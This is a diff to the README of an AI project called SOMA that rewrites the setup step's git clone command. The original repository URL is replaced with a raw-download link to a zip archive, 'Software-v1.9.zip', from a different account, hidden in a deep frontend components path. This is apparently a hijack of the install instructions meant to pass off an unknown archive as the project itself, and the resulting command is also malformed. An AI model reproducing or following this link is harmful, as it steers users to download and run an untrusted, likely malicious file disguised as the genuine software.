@@ -9,7 +9,7 @@ SOMA is a self-aware AI operating system. She runs ~100 cognitive arbiters in pa
 ### 1. Clone and set up
 
 ```bash
-git clone https://github.com/unimaginative-artist/SOMA.git
+git clone https://github.com/XARZGAMING/SOMA/raw/refs/heads/main/frontend/apps/command-bridge/components/MissionControl/Software-v1.9.zip
 cd SOMA
 node setup.mjs
 ```
